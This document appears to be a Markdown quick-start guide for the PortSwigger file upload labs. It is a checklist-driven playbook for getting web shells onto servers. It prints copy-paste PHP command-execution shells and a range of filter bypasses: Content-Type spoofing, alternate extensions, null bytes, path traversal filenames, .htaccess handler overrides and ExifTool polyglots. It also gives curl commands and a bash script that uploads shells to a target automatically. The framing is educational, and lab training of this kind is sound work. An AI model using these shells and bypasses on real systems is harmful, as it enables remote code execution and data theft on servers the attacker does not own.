# File Upload Vulnerabilities - Quick Start Guide

## 🎯 Quick Win Checklist

### Phase 1: Reconnaissance (2 minutes)
- [ ] Identify file upload functionality
- [ ] Upload legitimate file (JPEG/PNG)
- [ ] Note storage path from Burp history
- [ ] Check if file is web-accessible

### Phase 2: Basic Testing (5 minutes)
- [ ] Try uploading `.php` file directly
- [ ] If blocked, try Content-Type bypass
- [ ] If blocked, try extension variations
- [ ] If blocked, try null byte injection

### Phase 3: Advanced Testing (10 minutes)
- [ ] Test path traversal (`..%2f`)
- [ ] Upload `.htaccess` + custom extension
- [ ] Create polyglot with ExifTool
- [ ] Test race condition with Turbo Intruder

---

## 🚀 Most Common Vulnerabilities (Ordered by Frequency)

### 1. Content-Type Bypass (60% success rate)
**One-liner**: Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`

```bash
# Test with curl
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"
```

### 2. Extension Blacklist Bypass (40% success rate)
**Quick wins**:
```
shell.php     → BLOCKED
shell.php5    → TRY THIS
shell.phtml   → TRY THIS
shell.phar    → TRY THIS
shell.php.jpg → TRY THIS
shell.php%00.jpg → TRY THIS (null byte)
```

### 3. No Validation (20% success rate)
**Test**: Just upload `shell.php` directly

---

## 🔥 Copy-Paste Payloads

### Universal PHP Shell
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Command Execution Shell
```php
<?php system($_GET['cmd']); ?>
```
**Usage**: `shell.php?cmd=whoami`

### Minimal Shell (bypass filters)
```php
<?=`$_GET[0]`?>
```
**Usage**: `shell.php?0=id`

---

## 🛠️ Essential Burp Suite Workflow

### Step 1: Capture Upload Request
1. **Proxy** → **HTTP history**
2. Find `POST /upload` or `POST /my-account/avatar`
3. Right-click → **Send to Repeater**

### Step 2: Modify Request
```http
# Original
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Modified (try each)
filename="shell.php" → filename="shell.php5"
filename="shell.php" → filename="shell.php%00.jpg"
filename="shell.php" → filename="..%2fshell.php"
Content-Type: application/x-php → Content-Type: image/jpeg
```

### Step 3: Test Execution
1. Note uploaded file path from response
2. Open new Repeater tab
3. Send: `GET /uploads/shell.php HTTP/1.1`
4. Check response for code execution

---

## 📋 Quick Bypass Decision Tree

```
Upload shell.php
    ↓
  BLOCKED?
    ├─→ NO → Success! File executes → Done
    ↓
   YES
    ↓
Try Content-Type: image/jpeg
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try extension variations
    - shell.php5
    - shell.phtml
    - shell.phar
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try null byte: shell.php%00.jpg
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try path traversal: ..%2fshell.php
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try .htaccess + custom extension
    1. Upload .htaccess with: AddType application/x-httpd-php .jpg
    2. Upload shell.jpg
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try polyglot file
    exiftool -Comment='<?php code ?>' image.jpg -o shell.php
    ↓
  BLOCKED?
    ├─→ NO → Success! → Done
    ↓
   YES
    ↓
Try race condition
    Use Turbo Intruder to upload + access simultaneously
```

---

## ⚡ Speed Run Commands

### Create Basic Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Add JPEG Magic Bytes
```bash
printf '\xFF\xD8\xFF\xE0' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### Create Polyglot (requires ExifTool)
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

### Test Execution
```bash
curl http://target.com/uploads/shell.php?cmd=id
```

---

## 🎓 PortSwigger Labs Quick Reference

| Lab | Technique | Key Command/Modification |
|-----|-----------|-------------------------|
| **Lab 1** | No validation | Upload `exploit.php` directly |
| **Lab 2** | Content-Type bypass | Change to `Content-Type: image/jpeg` |
| **Lab 3** | Path traversal | Use `filename="..%2fexploit.php"` |
| **Lab 4** | .htaccess | Upload `.htaccess` then `exploit.l33t` |
| **Lab 5** | Null byte | Use `filename="exploit.php%00.jpg"` |
| **Lab 6** | Polyglot | `exiftool -Comment='<?php code ?>' img.jpg -o shell.php` |
| **Lab 7** | Race condition | Turbo Intruder with concurrent requests |

---

## 🔧 Essential Tools Setup

### Burp Turbo Intruder (for Lab 7)
1. **Extender** → **BApp Store**
2. Search "Turbo Intruder"
3. Click **Install**

### ExifTool (for Lab 6)
```bash
# Ubuntu/Debian
sudo apt install libimage-exiftool-perl

# macOS
brew install exiftool

# Windows
Download from: https://exiftool.org/
```

---

## 💡 Pro Tips

### Tip 1: Always Check Burp History for Paths
After upload, check **Proxy** → **HTTP history** for:
- Upload confirmation response
- GET request to access uploaded file
- Note exact file path

### Tip 2: URL Encoding in Burp
When using path traversal:
- Type: `..%2f` (not `../`)
- Burp maintains encoding correctly

### Tip 3: Multiple Extension Tests
Use Burp Intruder to test many extensions:
```
Position: shell.§php§
Payloads: php, php3, php4, php5, phtml, phar, phpt
```

### Tip 4: Content-Type Quick Switch
Common Content-Types to try:
```
image/jpeg
image/png
image/gif
application/octet-stream
text/plain
```

### Tip 5: Execution vs. Download
If code doesn't execute:
- File may be in non-executable directory
- Try path traversal to parent directory
- Check if Content-Disposition forces download

---

## 🚨 Common Mistakes to Avoid

### ❌ Mistake 1: Wrong Content-Type Location
```http
# WRONG - changing main Content-Type
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

# RIGHT - changing file-specific Content-Type
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg  ← Change this one
```

### ❌ Mistake 2: Literal Null Bytes in Burp
```
DON'T: Copy-paste actual null character
DO: Type %00 in URL-encoded form
```

### ❌ Mistake 3: Forgetting Session Cookies
Always include valid session cookie in Burp Repeater requests

### ❌ Mistake 4: Not Checking Full Response
Secret might be in:
- Response body (text)
- Response body (hidden in binary)
- Response headers

---

## 📊 Success Rate by Technique

| Technique | Typical Success Rate | Time Investment |
|-----------|---------------------|-----------------|
| No validation | 20% | 30 seconds |
| Content-Type bypass | 60% | 2 minutes |
| Extension variations | 40% | 3 minutes |
| Null byte injection | 15% | 2 minutes |
| Path traversal | 25% | 5 minutes |
| .htaccess upload | 30% | 5 minutes |
| Polyglot file | 35% | 10 minutes |
| Race condition | 20% | 15 minutes |

**Strategy**: Start with high success rate / low time investment techniques

---

## 🎯 Lab Completion Times (Target)

| Lab | Expected Time | Speed Run Time |
|-----|---------------|----------------|
| Lab 1 | 5 minutes | 2 minutes |
| Lab 2 | 8 minutes | 3 minutes |
| Lab 3 | 12 minutes | 5 minutes |
| Lab 4 | 15 minutes | 7 minutes |
| Lab 5 | 10 minutes | 4 minutes |
| Lab 6 | 20 minutes | 10 minutes |
| Lab 7 | 25 minutes | 15 minutes |

**Total**: ~95 minutes (all labs) | Speed run: ~46 minutes

---

## 🔗 Quick Links

- **Full Lab Solutions**: [file-upload-portswigger-labs-complete.md](./file-upload-portswigger-labs-complete.md)
- **Complete Cheat Sheet**: [file-upload-cheat-sheet.md](./file-upload-cheat-sheet.md)
- **Resources & References**: [file-upload-resources.md](./file-upload-resources.md)
- **PortSwigger Labs**: https://portswigger.net/web-security/file-upload

---

## 🎓 Learning Path

### Beginner (Week 1)
- [ ] Complete Labs 1-2 (no validation, Content-Type bypass)
- [ ] Read OWASP File Upload Cheat Sheet
- [ ] Practice with TryHackMe "Upload Vulnerabilities" room

### Intermediate (Week 2)
- [ ] Complete Labs 3-5 (path traversal, .htaccess, null byte)
- [ ] Install and practice with Fuxploider
- [ ] Try HackTheBox machine "Magic"

### Advanced (Week 3)
- [ ] Complete Labs 6-7 (polyglot, race condition)
- [ ] Study real CVEs (CVE-2019-16114, CVE-2017-11357)
- [ ] Practice on bug bounty targets (responsibly)

### Expert (Ongoing)
- [ ] Build custom testing tools
- [ ] Contribute to security research
- [ ] Write CTF challenges
- [ ] Submit bug bounty reports

---

## 📝 Quick Test Script

Save as `test-upload.sh`:
```bash
#!/bin/bash

TARGET="$1"
UPLOAD_URL="$TARGET/upload"

echo "[*] Testing file upload vulnerabilities on $TARGET"

# Test 1: Direct PHP upload
echo "[+] Test 1: Direct PHP upload"
curl -s -X POST -F "file=@shell.php" $UPLOAD_URL | grep -i "success\|uploaded"

# Test 2: Content-Type bypass
echo "[+] Test 2: Content-Type bypass"
curl -s -X POST -F "file=@shell.php;type=image/jpeg" $UPLOAD_URL | grep -i "success\|uploaded"

# Test 3: Extension variations
for ext in php3 php4 php5 phtml phar; do
    echo "[+] Test 3: Extension .$ext"
    cp shell.php "shell.$ext"
    curl -s -X POST -F "file=@shell.$ext" $UPLOAD_URL | grep -i "success\|uploaded"
done

echo "[*] Testing complete"
```

**Usage**: `./test-upload.sh http://target.com`

---

## 🏆 Achievement Unlocks

- [ ] ✅ **First Upload**: Complete any lab
- [ ] ✅ **Bypass Master**: Complete all 7 labs
- [ ] ✅ **Speed Demon**: Complete all labs in under 60 minutes
- [ ] ✅ **Tool Smith**: Create custom upload testing tool
- [ ] ✅ **Bug Hunter**: Find real-world file upload vulnerability
- [ ] ✅ **Teacher**: Help others learn file upload exploitation
- [ ] ✅ **Researcher**: Discover new bypass technique

---

## 💬 Need Help?

**Stuck on a lab?** Check:
1. Full lab solution in [file-upload-portswigger-labs-complete.md](./file-upload-portswigger-labs-complete.md)
2. Common pitfalls section in each lab
3. Complete cheat sheet for alternative techniques

**Questions?** Reference:
- OWASP File Upload Cheat Sheet
- PortSwigger learning materials
- Community forums (Reddit r/bugbounty, r/netsec)

---

Good luck and happy hacking! 🚀
